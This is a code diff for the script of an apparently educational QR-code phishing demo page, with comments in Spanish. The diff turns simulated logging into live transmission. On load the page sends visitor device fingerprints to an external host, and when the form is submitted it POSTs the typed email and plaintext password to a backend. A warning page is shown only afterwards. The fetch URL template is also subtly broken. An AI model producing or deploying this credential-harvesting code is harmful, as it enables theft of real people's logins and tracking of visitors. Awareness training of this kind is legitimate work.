@@ -205,82 +205,110 @@
     </div>
 
     <script>
-        // Recolectar información del dispositivo/navegador
-        function collectDeviceInfo() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toLocaleString(),
-                referrer: document.referrer || 'Directo (QR Code)',
-                cookiesEnabled: navigator.cookieEnabled,
-                onlineStatus: navigator.onLine,
-                browserName: getBrowserName(),
-                deviceType: getDeviceType()
-            };
-            return info;
+    // Recolectar información del dispositivo/navegador
+    function collectDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toLocaleString(),
+            referrer: document.referrer || 'Directo (QR Code)',
+            cookiesEnabled: navigator.cookieEnabled,
+            onlineStatus: navigator.onLine,
+            browserName: getBrowserName(),
+            deviceType: getDeviceType()
+        };
+        return info;
+    }
+    
+    function getBrowserName() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.includes('Chrome')) return 'Chrome';
+        if (userAgent.includes('Firefox')) return 'Firefox';
+        if (userAgent.includes('Safari')) return 'Safari';
+        if (userAgent.includes('Edge')) return 'Edge';
+        return 'Desconocido';
+    }
+    
+    function getDeviceType() {
+        const userAgent = navigator.userAgent;
+        if (/tablet|ipad|playbook|silk/i.test(userAgent)) return 'Tablet';
+        if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) return 'Móvil';
+        return 'Escritorio';
+    }
+    
+    // --- MODIFICACIÓN CLAVE: Enviar datos al backend ---
+    
+    // Función para enviar datos al backend
+    async function sendDataToBackend(endpoint, data) {
+        try {
+            // **IMPORTANTE**: Si tu backend está en un servidor real, reemplaza 'http://localhost:5000'
+            // con la URL pública de tu backend (por ejemplo, https://tu-backend-demo.azurewebsites.net)
+            // Si lo estás probando localmente, 'http://localhost:5000' es correcto.
+            const response = await fetch(`https://quishing-ashy.vercel.app{endpoint}`, { // Asegúrate de que esta URL coincida con tu backend
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            console.log(`Respuesta del backend (${endpoint}):`, result);
+        } catch (error) {
+            console.error(`Error al enviar datos a ${endpoint}:`, error);
         }
+    }
+
+    // Al cargar la página, enviar información de visita
+    window.addEventListener('load', function() {
+        const deviceInfo = collectDeviceInfo();
+        sendDataToBackend('/api/track-visit', deviceInfo);
+    });
+
+    // Manejar el envío del formulario
+    document.getElementById('phishingForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        function getBrowserName() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes('Chrome')) return 'Chrome';
-            if (userAgent.includes('Firefox')) return 'Firefox';
-            if (userAgent.includes('Safari')) return 'Safari';
-            if (userAgent.includes('Edge')) return 'Edge';
-            return 'Desconocido';
-        }
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const deviceInfo = collectDeviceInfo();
         
-        function getDeviceType() {
-            const userAgent = navigator.userAgent;
-            if (/tablet|ipad|playbook|silk/i.test(userAgent)) return 'Tablet';
-            if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) return 'Móvil';
-            return 'Escritorio';
-        }
-        
-        // Simular envío de datos y mostrar información recolectada
-        document.getElementById('phishingForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        const btn = document.querySelector('.btn');
+        btn.textContent = 'Procesando...';
+        btn.disabled = true;
+
+        // Enviar datos de la sumisión al backend
+        const submissionData = {
+            email: email,
+            password: password, // Precaución: En demo ok, en real NUNCA enviar así
+            device_info: deviceInfo
+        };
+        await sendDataToBackend('/api/track-submission', submissionData);
+
+        // Retraso para la UX y luego mostrar la advertencia
+        setTimeout(() => {
+            document.getElementById('warning').classList.add('show');
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const deviceInfo = collectDeviceInfo();
-            
-            // Simular "procesamiento"
-            const btn = document.querySelector('.btn');
-            btn.textContent = 'Procesando...';
-            btn.disabled = true;
+            const collectedDataDiv = document.getElementById('collectedData');
+            collectedDataDiv.innerHTML = `
+                <strong>📧 Email ingresado:</strong> ${email}<br>
+                <strong>🔒 Contraseña:</strong> ${'*'.repeat(password.length)} (${password.length} caracteres)<br>
+                <strong>📱 Dispositivo:</strong> ${deviceInfo.deviceType}<br>
+                <strong>🌐 Navegador:</strong> ${deviceInfo.browserName}<br>
+                <strong>🖥️ Sistema:</strong> ${deviceInfo.platform}<br>
+                <strong>📍 Zona horaria:</strong> ${deviceInfo.timezone}<br>
+                <strong>⏰ Timestamp:</strong> ${deviceInfo.timestamp}<br>
+                <strong>🔗 Llegaste desde:</strong> ${deviceInfo.referrer}
+            `;
             
             setTimeout(() => {
-                // Mostrar advertencia y datos recolectados
-                document.getElementById('warning').classList.add('show');
-                
-                const collectedDataDiv = document.getElementById('collectedData');
-                collectedDataDiv.innerHTML = `
-                    <strong>📧 Email ingresado:</strong> ${email}<br>
-                    <strong>🔒 Contraseña:</strong> ${'*'.repeat(password.length)} (${password.length} caracteres)<br>
-                    <strong>📱 Dispositivo:</strong> ${deviceInfo.deviceType}<br>
-                    <strong>🌐 Navegador:</strong> ${deviceInfo.browserName}<br>
-                    <strong>🖥️ Sistema:</strong> ${deviceInfo.platform}<br>
-                    <strong>📍 Zona horaria:</strong> ${deviceInfo.timezone}<br>
-                    <strong>⏰ Timestamp:</strong> ${deviceInfo.timestamp}<br>
-                    <strong>🔗 Llegaste desde:</strong> ${deviceInfo.referrer}
-                `;
-                
-                setTimeout(() => {
-                    document.getElementById('reveal').classList.add('show');
-                }, 2000);
-                
-            }, 1500);
-        });
-        
-        // Recolectar estadísticas básicas al cargar la página
-        window.addEventListener('load', function() {
-            const deviceInfo = collectDeviceInfo();
-            // En un escenario real, esto se enviaría a un servidor
-            console.log('Información recolectada:', deviceInfo);
-        });
-    </script>
+                document.getElementById('reveal').classList.add('show');
+            }, 2000);
+            
+        }, 1500);
+    });
+</script>
 </body>
 </html>
